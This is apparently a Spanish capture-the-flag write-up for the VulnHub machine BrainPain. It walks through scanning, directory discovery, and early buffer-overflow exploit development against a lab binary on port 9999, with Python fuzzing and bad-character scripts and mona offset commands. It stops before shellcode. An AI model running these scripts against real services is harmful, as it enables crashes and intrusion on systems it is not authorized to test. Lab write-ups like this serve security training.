# Resolviendo máquina BrainPain de VulnHub
---
### Software:

- Immunity Debugger
- mona.py
- VMware
- Dirsearch
- python

### OS:

 - Windows 10 Pro
 - Kali Linux
 - MV BrainPain
 ---
 ### Empezamos:
 En primer lugar, levantaremos la máquina BrainPain y desde nuestra Kali haremos un escaneo de nuestra red para ver si la encontramos. Para ello lanzamos:
 ````
 nmap 192.168.0.0/24 -v -O
 ````
 Una vez la identificamos nos damos cuenta que tiene abiertos los puertos 9999 y el 10000 con el servicio HTTP activo, por lo que abriremos la dirección en el navegador web.
 
##### Instalación y uso de "Dirsearch"
 Al entrar en la dirección web encontramos una imagen y no hay enlaces ni posibilidad de movernos por la web, por lo que utilizaremos el siguiente programa: ***Dirsearch***
 ````
 https://github.com/maurosoria/dirsearch
 git clone https://github.com/maurosoria/dirsearch.git
 cd dirsearch
 python3 dirsearch.py -u <URL> -e <EXTENSIONS>
 ````
 Al ejecutar el programa, econtramos que tiene un directorio: "/bin". Al entrar nos encontramos con un .exe.
 Por lo que llega el momento de irnos a nuestra máquina Windows 10 pro.

Al ejecutar el programa nos encontramos con esto:
 ````
 [+] initializing winsock...done.
 [+] server socket created.
 [+] bind done on port 9999
 [+] waiting for connections.
 
 ````

Se crea un server socket en el puerto 9999. Es el momento de crear un script en python para ser capaces de enviarles bytes al servidor y ver si somos capaces de encontrar un BOF.

##### Creacion del script

El script nombrado "brainpain.py" es muy sencillo, simplemente genera una conexión y manda los bytes que le indiquemos:
````
#!/usr/bin/python
import socket

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('xxx.xxx.xxx.xxx',9999))

buf = '\x41' * 1000

client.send(buf)
data = client.recv(len(buf))
client.close()
print data

````

#### Explotación del BoF
Al ejecutar el script le hemos enviado 1000 bytes al socket, la respuesta que recibimos nos deja caer que hemos sobreescrito la pila y por tanto hemos encontrado un BoF:
````
[+] received connection.
[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA( _]
[get_reply] copied 1003 bytes to buffer
````
Para tomar el control de EIP, usaremos el Inmunity Debbuger y el script de mona.
Estos son los pasos que hemos seguido:

1. Utilizar !mona para crear una cadena de carácteres de 1000 bytes y ver donde rompe el programa.

````
!mona pattern_create 1000
````
2. Una vez hemos enviado la cadena de 1000 bytes creada anteriormente,  vamos a ver donde rompe para tomar el control de EIP.
````
!mona pattern_offset 35724134 <--- Esta es la dirección de EIP
````
El resultado nos dice que en la posición 524 de la cadena de bytes es donde se rompe la cadena. Por lo que ya sabemos donde tendremos que poner la dirección de retorno.

3. Ahora es el momento de encontrar los badchars para ir a una dirección de retorno que no falle y crear una shellcode que nos funcione. Para ello:
````!mona bytearray -cpb "\x00"````
Así es como quedaría el script con la cadena de los badchars:
````
#!/usr/bin/python
import socket

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('192.168.1.129',9999))

buf = '\x41' * 524 #padding
buf += '\x42' * 4 #EIP 
buf += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
buf += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
buf += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
buf += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
buf += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
buf += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
buf += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
buf += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#badchars = 00 

client.send(buf)
data = client.recv(len(buf))
client.close()
print data
````

Para encontrar los badchars utilizaremos el siguiente comando:
````
!mona compare -f "Dirección donde esta el .bin" -a "Dirección de ESP"
!mona compare -f C:\logs\brainpan\bytearray.bin -a 005FF910
````
En este caso no hay ninguno por lo que no debemos de preocuparnos a la hora de generar la shellcode ni buscando la dirección de retorno.
